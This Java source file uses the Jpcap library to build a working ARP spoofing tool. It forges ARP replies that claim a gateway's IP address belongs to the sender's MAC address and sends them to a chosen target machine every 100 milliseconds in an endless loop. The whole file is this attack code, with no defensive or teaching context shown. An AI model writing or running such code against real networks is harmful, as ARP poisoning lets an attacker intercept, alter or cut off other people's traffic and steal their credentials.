/**
 * @author <a href="mailto:styrnov@wiley.com">tserj</a>
 * @version 24.06.11
 * http://netresearch.ics.uci.edu/kfujii/Jpcap/doc/samples.html
 */

import java.math.BigInteger;
import java.net.InetAddress;

import jpcap.*;
import jpcap.packet.*;

public class sender {

    public sender(String inetInterface, String mac, String ip, String gateway) {
        try {
            send(inetInterface, parseMacAddress(mac), InetAddress.getByName(ip), InetAddress.getByName(gateway));
        } catch (Exception e) {
            System.out.print(e.getMessage());
        }
    }

    private void send(String inetInterface, byte[] mac, InetAddress ip, InetAddress gateway) throws Exception {
        //find network interface
        int index = -1;
		NetworkInterface[] devices = JpcapCaptor.getDeviceList();

        for (int i=0; i<devices.length; i++) {
            if (devices[i].description.trim().equals(inetInterface)) {
                index = i;
                break;
            }
        }

        if (index == -1) {
            throw new IllegalArgumentException("can't find local interface");
        }

        //open a network interface to send a packet to
        JpcapSender sender = JpcapSender.openDevice(devices[index]);

/*
        InetAddress srcip = null;
        for (NetworkInterfaceAddress addr : devices[index].addresses) {
            if (addr.address instanceof Inet4Address) {
                srcip = addr.address;
                break;
            }
        }

        if (srcip == null) {
            throw new IllegalArgumentException("can't find local ip address");
        }

        byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};
*/

        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = devices[index].mac_address;
        arp.sender_protoaddr = gateway.getAddress();
        arp.target_hardaddr = mac;
        arp.target_protoaddr = ip.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = devices[index].mac_address;
        ether.dst_mac = mac;
        arp.datalink = ether;

        while (true) {
            sender.sendPacket(arp);
            Thread.sleep(100);
            System.out.print("Send...\n");
        }
    }

    private byte[] parseMacAddress(String macAddress) {
        String[] bytes = macAddress.split("-");
        byte[] parsed = new byte[bytes.length];

        for (int x = 0; x < bytes.length; x++) {
            BigInteger temp = new BigInteger(bytes[x], 16);
            byte[] raw = temp.toByteArray();
            parsed[x] = raw[raw.length - 1];
        }
        return parsed;
    }
}
